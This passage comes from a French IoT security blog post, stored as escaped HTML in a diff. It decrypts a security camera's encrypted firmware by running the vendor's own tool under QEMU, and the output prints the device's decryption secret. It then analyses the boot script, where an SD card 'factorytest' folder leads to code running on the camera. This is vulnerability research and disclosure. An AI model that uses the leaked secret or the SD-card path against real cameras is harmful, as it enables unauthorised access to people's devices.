+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;usage: %s [OPTIONS] ACTION&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pcVar1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mh">0xffffffff&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Cette analyse statique nous apprend également que &lt;strong>/usr/local/tool/ambulance&lt;/strong> utilise le secret &lt;strong>/etc/abmu&lt;/strong> dans son processus de déchiffrement &lt;em>(unpack)&lt;/em>.&lt;/p>
+&lt;p>Afin de gagner du temps, laissons de côté l&amp;rsquo;analyse statique et passons directement à un test dynamique de l&amp;rsquo;outil &lt;em>ambulance&lt;/em> sur le firmware chiffré obtenu précédemment &lt;em>z10kd-l_f3m10_APP2.3.0.11291_ota.enc&lt;/em>.&lt;/p>
+&lt;blockquote class="gblog-hint note">
+&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
+&lt;div class="gblog-hint__text">Il est à noter que l&amp;rsquo;outil &lt;em>ambulance&lt;/em> a été compilé en ARM, afin de pouvoir l&amp;rsquo;exécuter sur une machine x86&lt;em>64 on peut utiliser &lt;a
+class="gblog-markdown__link"
+href="https://www.qemu.org/"
+>QEMU&lt;/a>. De plus, _ambulance&lt;/em> a été compilé dynamiquement &lt;em>(dynamically linked)&lt;/em>, il faudra donc spécifier le chemin racine vers la bibliothèque &lt;em>/lib/ld-uClibc.so.0&lt;/em> avec le paramètre &lt;strong>-L&lt;/strong>&lt;/div>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ file ambulance
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ambulance: ELF 32-bit LSB executable, ARM, EABI5 version &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>SYSV&lt;span class="o">)&lt;/span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ mkdir out
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ sudo mv abmu /etc/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ qemu-arm -L extractions/firm.bin.extracted/1E0000/squashfs-root ./ambulance unpack ./z10kd-l_f3m10_APP2.3.0.11291_ota.enc out
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">unpack ./z10kd-l_f3m10_APP2.3.0.11291_ota.enc...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">abmu:&lt;span class="o">[&lt;/span>/TsY/&lt;span class="o">{&lt;/span>h4OQ%-*6N4Nb3&lt;span class="o">[&lt;/span>P&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start to generate key/iv, &lt;span class="nv">type&lt;/span>&lt;span class="o">=&lt;/span>AES-128-CBC, &lt;span class="nv">md&lt;/span>&lt;span class="o">=&lt;/span>SHA
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">return&lt;/span> val:16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">decrypt...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">filename&lt;span class="o">(&lt;/span>out/md5sum&lt;span class="o">)&lt;/span> filesize&lt;span class="o">(&lt;/span>95&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fd&lt;span class="o">(&lt;/span>4&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync ret1&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span> ret2&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">filename&lt;span class="o">(&lt;/span>out/user.squashfs.img&lt;span class="o">)&lt;/span> filesize&lt;span class="o">(&lt;/span>3026944&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fd&lt;span class="o">(&lt;/span>4&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync ret1&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span> ret2&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">filename&lt;span class="o">(&lt;/span>out/part.env&lt;span class="o">)&lt;/span> filesize&lt;span class="o">(&lt;/span>362&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fd&lt;span class="o">(&lt;/span>4&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync ret1&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span> ret2&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">filename&lt;span class="o">(&lt;/span>out/system.env&lt;span class="o">)&lt;/span> filesize&lt;span class="o">(&lt;/span>2011&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fd&lt;span class="o">(&lt;/span>4&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync ret1&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span> ret2&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">filename&lt;span class="o">(&lt;/span>out/fwup_preinst.sh&lt;span class="o">)&lt;/span> filesize&lt;span class="o">(&lt;/span>1694&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fd&lt;span class="o">(&lt;/span>4&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync ret1&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span> ret2&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">filename&lt;span class="o">(&lt;/span>out/DONTREADME&lt;span class="o">)&lt;/span> filesize&lt;span class="o">(&lt;/span>17&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">final decrypt &lt;span class="m">15&lt;/span> ... fd&lt;span class="o">(&lt;/span>4&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync ret1&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span> ret2&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">abmu&lt;span class="o">(&lt;/span>ret&lt;span class="o">)&lt;/span> &lt;span class="o">=&lt;/span> 0...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ tree out
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">out
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── DONTREADME
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── fwup_preinst.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── md5sum
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── part.env
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── system.env
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└── user.squashfs.img
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> directories, &lt;span class="m">6&lt;/span> files
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ binwalk out/user.squashfs.img
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /tmp/out/user.squashfs.img
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DECIMAL HEXADECIMAL DESCRIPTION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> 0x0 SquashFS file system, little endian, version: 4.0, compression: xz, inode count: 85, block size: 131072, image size: &lt;span class="m">3023262&lt;/span> bytes,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> created: 2024-12-03 01:42:54
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Analyzed &lt;span class="m">1&lt;/span> file &lt;span class="k">for&lt;/span> &lt;span class="m">110&lt;/span> file signatures &lt;span class="o">(&lt;/span>&lt;span class="m">249&lt;/span> magic patterns&lt;span class="o">)&lt;/span> in 7.0 milliseconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>On se retrouve donc avec le contenu en clair du firmware chiffré téléchargé. Dans la prochaine section, nous allons nous concentrer sur l&amp;rsquo;obtention d&amp;rsquo;une exécution de commandes sur la caméra.&lt;/p>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h2 id="retour-à-lusine"
+>
+Retour à l&amp;rsquo;usine
+&lt;/h2>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#retour-à-lusine" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Retour à l&amp;rsquo;usine" href="#retour-%c3%a0-lusine">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>Un deuxième script qui semble être intéressant est le script &lt;strong>/etc/init.d/rcS&lt;/strong> &lt;em>(script exécuté pendant le processus de lancement pour initialiser d&amp;rsquo;autres programmes)&lt;/em>. En effet, ce script comporte des termes tels que &lt;em>factorytest&lt;/em> ou encore &lt;em>SDcard&lt;/em> qui sonnent respectivement comme &lt;em>fonctionnalités d&amp;rsquo;administration&lt;/em> et &lt;em>source d&amp;rsquo;entrée de données&lt;/em>. Analysons donc ces parties du script :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">read&lt;/span> -t &lt;span class="m">1&lt;/span> -p &lt;span class="s2">&amp;#34; Press q -&amp;gt; ENTER to exit boot procedure? &amp;#34;&lt;/span> exit_boot
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$exit_boot&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;q&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">exit&lt;/span> &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nv">factorymode&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">grep &lt;span class="s2">&amp;#34; factorymode=1&amp;#34;&lt;/span> /proc/cmdline &amp;gt; /dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$?&lt;/span> -eq &lt;span class="m">0&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -x /usr/sbin/usbnet.sh &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /usr/sbin/usbnet.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">factorytest_dir&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/factorytest
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -x &lt;span class="nv">$factorytest_dir&lt;/span>/factorytest &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">factorymode&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;start factorytest portal ...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$factorytest_dir&lt;/span>/factorytest -s &lt;span class="nv">$factorytest_dir&lt;/span>/factorytest_run.sh &lt;span class="p">&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -x /usr/local/4g/RUN4G &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Run 4G ...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /usr/local/4g/RUN4G &lt;span class="p">&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wifi_up&lt;span class="o">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> x&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">WIRELESS_INTERFACE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> !&lt;span class="o">=&lt;/span> x&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">WLANNAME&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>cat /etc/wlanname&lt;span class="sb">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">lpcnt&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="m">1&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ifconfig &lt;span class="si">${&lt;/span>&lt;span class="nv">WLANNAME&lt;/span>&lt;span class="si">}&lt;/span> up &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nb">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">lpcnt&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$((&lt;/span>lpcnt &lt;span class="o">-&lt;/span> &lt;span class="m">1&lt;/span>&lt;span class="k">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span> &lt;span class="nv">$lpcnt&lt;/span> -gt &lt;span class="m">0&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;wifi up failed! reboot...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> sleep &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /sbin/reboot
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># the &amp;#39;reboot&amp;#39; will wait the &amp;#39;rcS&amp;#39; script, so exit here&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">exit&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> sleep &lt;span class="m">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$factorymode&lt;/span> -eq &lt;span class="m">0&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> /usr/local/tool/sdupdate_fwenc.sh
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> x&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$?&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">==&lt;/span> x&lt;span class="s2">&amp;#34;0&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;sdupdate fwenc succeed!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nb">exit&lt;/span> &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -d /mnt/sdcard/factorytest &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;start factorytest...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nb">cd&lt;/span> /mnt/sdcard/factorytest
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> /opt/sh/safe_exec.sh ./auth.ini ./factorytest.sh
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nb">exit&lt;/span> &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f /mnt/sdcard/fwup_autorun.sh &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /opt/sh/check_auth.sh /mnt/sdcard &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> sh /mnt/sdcard/fwup_autorun.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> wifi_up&lt;span class="p">&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f /etc/conf/upgrading &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;file upgrading exist......&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /usr/local/tool/app_recovery.sh &lt;span class="p">&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">exit&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;start dotstart ...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span> -x /opt/autoboot.sh &lt;span class="o">]&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> /opt/autoboot.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>On peut clairement voir que le script &lt;strong>/etc/init.d/rcS&lt;/strong> vérifie &lt;strong>si la variable &lt;em>$factorymode&lt;/em> est égale à 0&lt;/strong> et si c&amp;rsquo;est le cas, il exécute une chaîne d&amp;rsquo;instructions. Malgré la présence d&amp;rsquo;autres exploitables, nous allons nous concentrer sur le cas ci-dessous qui, à première vue, semble être le plus intéressant :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -d /mnt/sdcard/factorytest &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;start factorytest...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">cd&lt;/span> /mnt/sdcard/factorytest
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /opt/sh/safe_exec.sh ./auth.ini ./factorytest.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">exit&lt;/span> &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Il est possible de résumer cette condition par :&lt;/p>
+&lt;ol>
+&lt;li>Vérifie si un dossier au nom de &lt;em>factorytest&lt;/em> existe dans le contenu de la carte SD montée&lt;/li>
+&lt;li>Si oui, navigue vers le répertoire &lt;em>/mnt/sdcard/factorytest&lt;/em>&lt;/li>
+&lt;li>Exécute le script &lt;em>/opt/sh/safe_exec.sh&lt;/em> en lui passant les fichiers &lt;em>./auth.ini&lt;/em> et &lt;em>./factorytest.sh&lt;/em> en paramètre&lt;/li>
+&lt;/ol>
+&lt;p>Analysons donc le contenu de &lt;strong>/opt/sh/safe_exec.sh&lt;/strong> :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#########################################################&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># auth.ini example:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># KEY=12345678901234567&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># MD5SUM_FILE=test.md5sum&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># MD5SUM_MD5=b757a9fc7aa080272c37902c701e2eb4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#########################################################&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">THISDIR&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>dirname &lt;span class="nv">$0&lt;/span>&lt;span class="sb">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">AUTH_FILE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SCRIPT_FILE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">exit_with_msg&lt;span class="o">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">exit&lt;/span> &lt;span class="nv">$1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
